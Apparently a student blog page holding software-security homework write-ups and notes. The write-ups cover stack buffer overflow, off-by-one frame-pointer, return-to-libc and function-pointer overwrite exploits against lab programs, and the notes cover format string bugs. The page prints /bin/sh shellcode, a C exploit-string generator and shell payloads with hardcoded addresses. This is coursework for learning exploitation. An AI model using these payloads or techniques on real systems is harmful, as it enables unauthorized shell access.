-<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589152125/VirtualBox_System_Security_VM_1_11_05_2020_01_08_11_f3otdb.png" alt=""></p>
-<p>By gdb, we got the address of b[0] which we could update our input data. We reused the example to generate a string, which concludes the shellcode  and repeated b[0] address.</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> shellcode[] = <span class="string">""</span></span><br><span class="line">  <span class="string">"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"</span></span><br><span class="line">  <span class="string">"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"</span></span><br><span class="line">  <span class="string">"\x80\xe8\xdc\xff\xff\xff/bin/sh"</span>;</span><br><span class="line"><span class="comment">// usage: exploit target-prog buffer-size target-addr</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>**argv)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">char</span> *buff, *ptr;</span><br><span class="line">  <span class="keyword">int</span> bsize = <span class="number">272</span>;</span><br><span class="line">  <span class="keyword">long</span> <span class="keyword">int</span> addr = <span class="number">0xbffff724</span>; <span class="comment">//the address of the b[0]</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Generating buffer with size %d and target address %08x\n"</span>, bsize, addr)</span><br><span class="line">  <span class="comment">// allocate buffer for exploit string</span></span><br><span class="line">  buff = <span class="built_in">malloc</span>(bsize);</span><br><span class="line">  <span class="comment">// fill whole buffer with the target address</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; bsize; i+=<span class="number">4</span>)</span><br><span class="line">    <span class="built_in">memcpy</span>(buff+i, &amp;addr, <span class="number">4</span>);</span><br><span class="line">  <span class="comment">// put shellcode to the beginning of exploit string</span></span><br><span class="line">  <span class="built_in">memcpy</span>(buff, shellcode, <span class="built_in">strlen</span>(shellcode));</span><br><span class="line">  <span class="comment">// terminate string</span></span><br><span class="line">  buff[bsize - <span class="number">1</span>] = <span class="string">'\0'</span>;</span><br><span class="line">  <span class="comment">// print buffer</span></span><br><span class="line">	FILE* f;</span><br><span class="line">    f = fopen(<span class="string">"input"</span>, <span class="string">"w"</span>);</span><br><span class="line">    <span class="built_in">fputs</span>(buff, f);</span><br><span class="line">	fclose(f);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
-
-<p>Below is what our input data file.</p>
-<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589152471/Screenshot_from_2020-05-11_01-14-11_osmqdu.png" alt=""></p>
-<p>Reload into the target vulnerable program. Get the shell.</p>
-<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589146113/webwxgetmsgimg_picr9k.png" alt=""></p>
-<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589066162/Screenshot_from_2020-05-10_01-14-16_pqlfuj.png" alt=""></p>
-<img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589066162/Screenshot_from_2020-05-10_01-14-27_iwhh8d.png" alt="zo" style="zoom:50%;" />
-
-<p>The problem 3 is the similar to the problem1, but with limitation for a prefix ‘login=’ , we rewrote the shellcode with a prefix ‘login=’,</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> shellcode[] = <span class="string">"login="</span></span><br><span class="line">  <span class="string">"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"</span></span><br><span class="line">  <span class="string">"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"</span></span><br><span class="line">  <span class="string">"\x80\xe8\xdc\xff\xff\xff/bin/sh"</span>;</span><br></pre></td></tr></table></figure>
-
-<p>And we inserted some debugging codes into the target program in order to locate the address of str2.</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span> <span class="params">(<span class="keyword">char</span> *str)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">char</span> str1[<span class="number">256</span>];</span><br><span class="line">  <span class="keyword">char</span> str2[<span class="number">512</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Address of buffer in str1 program: %08x\n"</span>, str1); <span class="comment">//edited </span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Address of buffer in str2 program: %08x\n"</span>, str2); <span class="comment">//edited </span></span><br><span class="line">  <span class="built_in">strcpy</span>(str2,str);</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">    str1[i] = str2[<span class="number">2</span>*i];</span><br><span class="line">  str1[<span class="number">255</span>] = <span class="string">'\0'</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, str1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>By the help of gdb, we located the address , since the real shell code begin after the ‘login=’, we should also plus 6 when assigning the repeated return address. For example, in our case, although address of str2 is 0xbffff144, we need to attempt to write 0xbffff14a to the return address.</p>
-<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589156595/VirtualBox_System_Security_VM_1_11_05_2020_02_13_31_p93oho.png" alt=""></p>
-<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589066162/Screenshot_from_2020-05-10_01-14-07_uhiodq.png" alt=""></p>
-<blockquote>
-<p> not solved, no find command available in gdb, failed to find the correct address of ‘bin/sh’</p>
-</blockquote>
-<p>Later updated: the address of the ‘bin/sh’ is found.</p>
-<ol>
-<li><p>finding the ‘bin/sh’ without ‘find’.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(gdb)b main</span><br><span class="line">(gdb)r</span><br><span class="line">(gdb)info proc map</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589200490/Screenshot_from_2020-05-11_14-25-29_ny8gib.png" alt=""></p>
-<p>The address of ‘bin/sh’ should be between 0xb7e8f000 and 0xb7fd8000. Since ‘find’ is not available, we have to spent hours to find it manually(eg. x/10000s 0xb7e8f000) , finally it was found located at address 0xb7fbb3ce </p>
-<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589200490/Screenshot_from_2020-05-11_14-26-59_gcndkd.png" alt=""></p>
-</li>
-<li><p>finding address of system(), </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(gdb)b main</span><br><span class="line">(gdb)r</span><br><span class="line">(gdb)p system</span><br></pre></td></tr></table></figure>
-
-<p>System address 0xb7ec7990</p>
-</li>
-<li><p>Construct our ‘Return to libc’ overwritting buffer.</p>
-</li>
-</ol>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> Relib[] = <span class="string">"AAAAAAAA"</span></span><br><span class="line">	<span class="string">"\x90\x79\xec\xb7"</span></span><br><span class="line">		<span class="string">"AAAA"</span></span><br><span class="line">	<span class="string">"\xce\xb3\xfb\xb7"</span>;</span><br></pre></td></tr></table></figure>
-
-<ol start="4">
-<li><p>got the shell</p>
-<p>The address of b is start at 0xbffff7a4, </p>
-<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589200888/P4_vyezob.png" alt=""></p>
-<ul>
-<li>updated after the exercise session: we just need to cover start shellcode begun with some nops, and write the return address with the previous argument address.</li>
-</ul>
-</li>
-</ol>
-<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589066162/Screenshot_from_2020-05-10_01-13-31_wpuhor.png" alt=""></p>
-<img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589066162/Screenshot_from_2020-05-10_01-13-58_xnve6i.png" style="zoom:50%;" />
-
-<table>
-<thead>
-<tr>
-<th></th>
-<th></th>
-<th></th>
-<th></th>
-<th></th>
-<th>char j[0]</th>
-<th>char j[1]</th>
-<th align="center">char j[2]</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>0xbffff850</td>
-<td>0xbffff851</td>
-<td>0xbffff852</td>
-<td>0xbffff853</td>
-<td>0xbffff854</td>
-<td>0xbffff855</td>
-<td>0xbffff856</td>
-<td align="center">0xbffff857</td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-<td align="center"></td>
-</tr>
-<tr>
-<td>int a</td>
-<td>int a</td>
-<td>int a</td>
-<td>int a</td>
-<td>int b</td>
-<td>int b</td>
-<td>int b</td>
-<td align="center">int b</td>
-</tr>
-<tr>
-<td>0xbffff858</td>
-<td>0xbffff859</td>
-<td>0xbffff85a</td>
-<td>0xbffff85b</td>
-<td>0xbffff85c</td>
-<td>0xbffff85d</td>
-<td>0xbffff85e</td>
-<td align="center">0xbffff85f</td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-<td align="center"></td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-<td align="center"></td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-<td></td>
-<td>char c</td>
-<td>int d</td>
-<td>int d</td>
-<td>int d</td>
-<td align="center">int d</td>
-</tr>
-<tr>
-<td>0xbffff860</td>
-<td>0xbffff861</td>
-<td>0xbffff862</td>
-<td>0xbffff863</td>
-<td>0xbffff864</td>
-<td>0xbffff865</td>
-<td>0xbffff866</td>
-<td align="center">0xbffff867</td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-<td align="center"></td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-<td>short e</td>
-<td>short e</td>
-<td>int f</td>
-<td>int f</td>
-<td>int f</td>
-<td align="center">int f</td>
-</tr>
-<tr>
-<td>0xbffff868</td>
-<td>0xbffff869</td>
-<td>0xbffff86a</td>
-<td>0xbffff86b</td>
-<td>0xbffff86c</td>
-<td>0xbffff86d</td>
-<td>0xbffff86e</td>
-<td align="center">0xbffff86f</td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-<td align="center"></td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-<td align="center"></td>
-</tr>
-<tr>
-<td></td>
-<td>char g</td>
-<td>short h</td>
-<td>short h</td>
-<td>int i</td>
-<td>int i</td>
-<td>int i</td>
-<td align="center">int i</td>
-</tr>
-<tr>
-<td>0xbffff870</td>
-<td>0xbffff871</td>
-<td>0xbffff872</td>
-<td>0xbffff873</td>
-<td>0xbffff874</td>
-<td>0xbffff875</td>
-<td>0xbffff876</td>
-<td align="center">0xbffff877</td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-<td align="center"></td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-<td align="center"></td>
-</tr>
-<tr>
-<td>int k</td>
-<td>int k</td>
-<td>int k</td>
-<td>int k</td>
-<td></td>
-<td></td>
-<td></td>
-<td align="center"></td>
-</tr>
-<tr>
-<td>0xbffff878</td>
-<td>0xbffff879</td>
-<td>0xbffff87a</td>
-<td>0xbffff87b</td>
-<td>0xbffff87c</td>
-<td>0xbffff87d</td>
-<td>0xbffff87e</td>
-<td align="center">0xbffff87f</td>
-</tr>
-</tbody></table>
-<p>The figure above is right after all the variables are declared, that is a breakpoint before the line 14.</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/15/SWS/Submission03/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Seven ♂">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.JPG">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Seven's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/05/15/SWS/Submission03/" itemprop="url">Submission03 of SWS</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-05-15T10:44:09+02:00">
-                2020-05-15
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/theory/" itemprop="url" rel="index">
-                    <span itemprop="name">theory</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="Submission03-of-SWS"><a href="#Submission03-of-SWS" class="headerlink" title="Submission03 of SWS"></a>Submission03 of SWS</h2><h2 id="Xusong-Wang-3375907"><a href="#Xusong-Wang-3375907" class="headerlink" title="Xusong Wang 3375907"></a>Xusong Wang 3375907</h2><h2 id="Huicheng-Qian-3443114"><a href="#Huicheng-Qian-3443114" class="headerlink" title="Huicheng Qian 3443114"></a>Huicheng Qian 3443114</h2><h2 id="Shkodran-Abdullahu-3466256"><a href="#Shkodran-Abdullahu-3466256" class="headerlink" title="Shkodran Abdullahu 3466256"></a>Shkodran Abdullahu 3466256</h2><p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589555954/sws-homework-03-page-002_avhnuq.jpg" alt=""></p>
-<p>Considering the data on the buffer is generated by sof-exploit-reverse-exploit and unchangable, and the argv[1] which includes the return address is only 4 bytes, we need to design a stack, whose return address is able to surely covered by argv[1],  the easiest way to creat a code which meet the requirement successfully is shown below:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span> <span class="params">(<span class="keyword">char</span> *str)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> b[<span class="number">64</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"address of b[] is @ %08x\n"</span>,b);</span><br><span class="line">  <span class="built_in">strcpy</span>(b,str);  &#125;</span><br><span class="line">	<span class="comment">// put your code here</span></span><br></pre></td></tr></table></figure>
-
-<p>A local variable with width 64bytes, which is followed the old frame poiter with 4 byte, could be just exploited by our sof-exploit-reverse-exploit.</p>
-<img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589563791/p1-2_jn8nv2.png" alt="e" style="zoom:80%;" />
-
-<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589563492/p1_i3bjob.png" alt=""></p>
-<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589555953/sws-homework-03-page-003_e7d1fq.jpg" alt=""></p>
-<p>What we should do is that to change the value of the saved based pointer of function b, make it to point an address just one word below the location where start address of shellcode is.</p>
-<img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589587744/Screenshot_2020-05-16_02-07-54_jic9un.png" alt="c" style="zoom:100%;" />
-
-<p>According the known information:</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Shellcode at: 0x80496c0</span><br><span class="line">Address of buffer in exploitable program: 0xbffff798</span><br><span class="line">Framepointer before copy: bffff7c8</span><br></pre></td></tr></table></figure>
-
-<p>We change the  value of the saved based pointer of function b to 0xbffff798, where is the start address of buffer. Then we need to put start address of shellcode at 0xbffff79c, at last our construction string is shown as below</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">(<span class="built_in">echo</span> -e <span class="string">"aaaa\xc0\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaa\x98"</span>)</span></span><br></pre></td></tr></table></figure>
-
-<p>Got the shell.</p>
-<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589588117/Screenshot_2020-05-16_02-14-55_okxth7.png" alt=""></p>
-<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589625612/Screenshot_2020-05-16_12-39-35_wi2ou0.png" alt=""></p>
-<p>From the previous problem, we are able to attack by using the return to libc. According to the previous explanation, since we already control the return address, we could assign the return address with the address of system function, and put the address of “bin/bash” at a distance of 4 bytes, the figure shown as below:</p>
-<img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589648099/Screenshot_2020-05-16_18-54-38_h4tm9a.png" alt="e" style="zoom:67%;" /> 
-
-<p>By invoking the system function, we could pass ‘bin/bash’ to it as an argument, so we should construct our payload like this:     |dummy + address of system + dummy + address of “/bin/sh” + dummy|, but we still need to find out the address of “bin/sh” and  system.</p>
-<ol>
-<li><p>finding the ‘bin/sh’.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(gdb)b main</span><br><span class="line">(gdb)r</span><br><span class="line">(gdb)info proc map</span><br></pre></td></tr></table></figure>
-
-<p>The address of ‘bin/sh’ should be between 0xb7e8f000 and 0xb7fd8000. Since ‘find’ is not available, we have to spent some time to find it manually(eg. x/10000s 0xb7e8f000) , finally it was found located at address 0xb7fbb3ce </p>
-<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589648770/Screenshot_2020-05-16_19-04-19_o7agqn.png" alt=""></p>
-<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589648770/Screenshot_2020-05-16_19-04-41_nt97ux.png" alt=""></p>
-<p>address of “/bin/sh”  0xb7fbb3ce</p>
-</li>
-<li><p>finding address of system(), </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(gdb)b main</span><br><span class="line">(gdb)r</span><br><span class="line">(gdb)p system</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589648770/Screenshot_2020-05-16_19-05-22_i06izw.png" alt=""></p>
-<p>System address 0xb7ec7990</p>
-</li>
-<li><p>Construct our payload and get the shell.</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">isuser@ubuntu:/mnt/homework03/p3$ ./obo-exploit-1-target   $(echo -e "aaaa\x90\x79\xec\xb7aaaa\xce\xb3\xfb\xb7aaaaaaaaaaaaaaaa\x98"&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589648770/Screenshot_2020-05-16_19-05-46_rt1h0t.png" alt=""></p>
-</li>
-</ol>
-<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589625612/Screenshot_2020-05-16_12-39-43_h1pl8e.png" alt=""></p>
-<p>Because error_handler points to the function of print_error ,buf[12] is in the BSS segment, which right next to the error_handler, we could overwrite the buf[12] and error_handler by designed payload , which starts with 12 times nop, then a address point to shell code, at last the shellcode, as below:</p>
-<img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589746300/1_coc2we.png" alt="e" style="zoom:150%;" />
-
-<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589625612/Screenshot_2020-05-16_12-39-49_lgmewq.png" alt=""></p>
-<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589555953/sws-homework-03-page-005_dbn8nb.jpg" alt=""></p>
-<p>| Step | printf-internal | printf-internal | Output    |<br>|      | loop pointer    | stack pointer   | up to now |<br>|——+—————–+—————–+—————-|<br>|    0 | 0812ff02        | bffff544        | (empty)       |<br>|    1 | 0812ff03        | bffff544        |    a              |<br>|    2 | 0812ff04        | bffff544        |    ab            |<br>|    3 | 0812ff05        | bffff544        |    abc          |<br>|    4 | 0812ff06        | bffff544        |    abc          |<br>|    5 | 0812ff07        | bffff548        |    abc66      |<br>|    6 | 0812ff08        | bffff548        |    abc66x    |<br>|    7 | 0812ff09        | bffff548        |    abc66xy  |<br>|    8 | 0812ff0a        | bffff548        |    abc66xy  |<br>|    9 | 0812ff0b        | bffff54c        |    abc66xyFoobar|</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/14/SWS/SWS_Notes/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Seven ♂">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.JPG">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Seven's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/05/14/SWS/SWS_Notes/" itemprop="url">SWS_Notes</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-05-14T10:44:09+02:00">
-                2020-05-14
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/theory/" itemprop="url" rel="index">
-                    <span itemprop="name">theory</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="1-Buffer-overflow"><a href="#1-Buffer-overflow" class="headerlink" title="1. Buffer overflow"></a>1. Buffer overflow</h1><h2 id="1-3-Format-String"><a href="#1-3-Format-String" class="headerlink" title="1.3 Format String"></a>1.3 Format String</h2><h3 id="1-3-1-Condition"><a href="#1-3-1-Condition" class="headerlink" title="1.3.1 Condition"></a>1.3.1 Condition</h3><p>IF Attacker is able to provide the format string to an ANSI C format function, a format string vulnerability is present.</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Wrong  he can control the entire ASCIIZ-string</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func</span> <span class="params">(<span class="keyword">char</span> *user)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span> (user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Correct</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func</span> <span class="params">(<span class="keyword">char</span> *user)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span> (<span class="string">"%s"</span>, user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="1-3-2-Format-family"><a href="#1-3-2-Format-family" class="headerlink" title="1.3.2 Format family"></a>1.3.2 Format family</h3><ul>
-<li>fprint - prints to a FILE stream</li>
-<li>print  - prints to the ‘stdout’ stream</li>
-<li>sprintf - prints into a string</li>
-<li>snprintf - prints into a string with length checking</li>
-</ul>
-<p>some relatives:</p>
-<ul>
-<li>setproctitle - set argv[]</li>
-<li>syslog - output to the syslog facility</li>
-<li>others like err<em>, verr</em>, vwarn*</li>
-</ul>
-<h3 id="1-3-3-What-is-a-format-string"><a href="#1-3-3-What-is-a-format-string" class="headerlink" title="1.3.3 What is a format string?"></a>1.3.3 What is a format string?</h3><p>A fortmat string is an ASCIIZ string that contains text and format parameter.</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span> (<span class="string">"The magic number is: \x25d\n"</span>, <span class="number">23</span>);</span><br></pre></td></tr></table></figure>
-
-<p>Above code works because 0x25 is the %, and \ symbol is something try to interprete the special characters for compiler.</p>
-<h2 id="2-1-what-are-we-able-to-control"><a href="#2-1-what-are-we-able-to-control" class="headerlink" title="2.1 what are we able to control"></a>2.1 what are we able to control</h2><h3 id="2-1-1-Crach-of-the-program"><a href="#2-1-1-Crach-of-the-program" class="headerlink" title="2.1.1 Crach of the program"></a>2.1.1 Crach of the program</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"%s%s%s%s%s%s%s%s%s%s%s%s"</span>);</span><br></pre></td></tr></table></figure>
-
-<p>Since %s displays memory from an address that is supplied on the stack.展示的是stack地址上所表征的字符串。</p>
-<table>
-<thead>
-<tr>
-<th>parameter</th>
-<th>output</th>
-<th>passed as</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>%s</td>
-<td>string</td>
-<td>reference</td>
-</tr>
-<tr>
-<td>%n</td>
-<td>number of bytes written so far</td>
-<td>reference</td>
-</tr>
-</tbody></table>
-<p>我们很有可能拿到illegal address，就是没有map任何memory，%n也是同样的道理，因此我们重复使用多次之后，就可以保证crash is present.</p>
-<p>2.1.2 Viewing the process memory 查看进程的记忆体</p>
-<p>利用format function - 各类printf及其亲属的打印功能，可以查看很多information</p>
-<p>####2.1.3Viewing the stack</p>
-<p>查看format string:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"%08x.%08x.%08x.%08x.%08x\n"</span>);</span><br></pre></td></tr></table></figure>
-
-<p>From bottom upward to the top of the stack - assuming the stack grows towards the low addresses</p>
-<p>到底是指看哪里的数据？？？</p>
